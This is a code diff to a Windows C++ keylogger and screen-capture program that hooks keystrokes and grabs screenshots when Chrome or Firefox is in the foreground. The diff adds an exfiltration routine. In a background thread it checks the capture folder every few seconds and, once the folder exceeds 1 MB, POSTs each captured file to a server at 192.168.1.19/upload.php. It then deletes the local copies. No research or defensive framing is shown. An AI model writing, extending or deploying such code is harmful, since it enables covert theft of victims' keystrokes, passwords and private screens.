@@ -4,8 +4,12 @@
 #include <string>
 #include <thread>
 #include <gdiplus.h>
+#include <wininet.h>
+#include <filesystem>
+#include <fstream>
 
 #pragma comment(lib, "Gdiplus.lib")
+#pragma comment(lib, "wininet.lib")
 
 using namespace std;
 using namespace Gdiplus;
@@ -98,7 +102,6 @@ void takeScreenshot() {
     ReleaseDC(NULL, hdcScreen);
 }
 
-
 DWORD GetProcessIdFromWindowsHandle(HWND hwnd) {
     DWORD pid = 0;
     GetWindowThreadProcessId(hwnd, &pid);
@@ -176,8 +179,6 @@ void isChrome() {
         CloseHandle(hForegroundWindow);
     }
 }
-
-
 
 LRESULT __stdcall appendFile(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
@@ -433,10 +434,86 @@ void ReleaseHook() {
     UnhookWindowsHookEx(_hook);
 }
 
+bool UploadFileToServer(const std::string& filePath, const std::string& filename, const std::string& host, const std::string& resource) {
+    HINTERNET hInternet = InternetOpenA("Uploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return false;
 
-//void sendData() {
-//
-//}
+    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Read file
+    std::ifstream file(filePath, std::ios::binary);
+    std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    std::string boundary = "----boundary123";
+    std::string header = "Content-Type: multipart/form-data; boundary=" + boundary;
+
+    std::string body =
+        "--" + boundary + "\r\n"
+        "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n"
+        "Content-Type: application/octet-stream\r\n\r\n" +
+        fileContents + "\r\n--" + boundary + "--\r\n";
+
+    BOOL result = HttpSendRequestA(hRequest, header.c_str(), header.length(), (LPVOID)body.c_str(), body.length());
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    return result;
+}
+
+void sendAndDeleteData() {
+    //std::cout << "[+] Running sendAndDeleteData function using thread!\n";
+    std::string exeDir = GetExecutableDir();
+    std::string captureDir = exeDir + "\\capture";
+    std::string host = "192.168.1.19";
+    std::string resource = "/upload.php";
+
+    std::uintmax_t totalSize = 0;
+
+    while (true) {
+        Sleep(6000);
+        // First, calculate the total size of all files in captureDir
+        for (const auto& entry : std::filesystem::directory_iterator(captureDir)) {
+            if (entry.is_regular_file()) {
+                totalSize += std::filesystem::file_size(entry);
+            }
+        }
+        std::cout << "Capture Directory Size: " << totalSize << std::endl;
+        // Proceed only if size > 1MB (1MB = 1048576 bytes)
+        if (totalSize >= 1048576) {
+            std::cout << "[+] Excided 1mb\n";
+            // Upload and delete files
+            for (const auto& entry : std::filesystem::directory_iterator(captureDir)) {
+                if (entry.is_regular_file()) {
+                    std::string filePath = entry.path().string();
+                    std::string filename = entry.path().filename().string();
+                    std::cout << "[*] Uploading: " << filePath << std::endl;
+                    if (UploadFileToServer(filePath, filename, host, resource)) {
+                        std::filesystem::remove(filePath);
+                        std::cout << "[+] Uploaded and Deleted: " << filePath << std::endl;
+                    }
+                    else {
+                        std::cout << "[-] Failed to upload: " << filePath << std::endl;
+                    }
+                }
+            }
+        }
+        totalSize = 0;
+    }
+}
 
 int main() {
     std::string exeDir = GetExecutableDir();
@@ -444,12 +521,14 @@ int main() {
 
     thread screenCaptureFirefoxThread(isFirefox);
     thread screenCaptureChromeThread(isChrome);
+    thread screenSendAndDeleteDataThread(sendAndDeleteData);
 
     capture();
     ReleaseHook();
 
     screenCaptureFirefoxThread.join();
     screenCaptureChromeThread.join();
+    screenSendAndDeleteDataThread.join();
 
     return 0;
 }
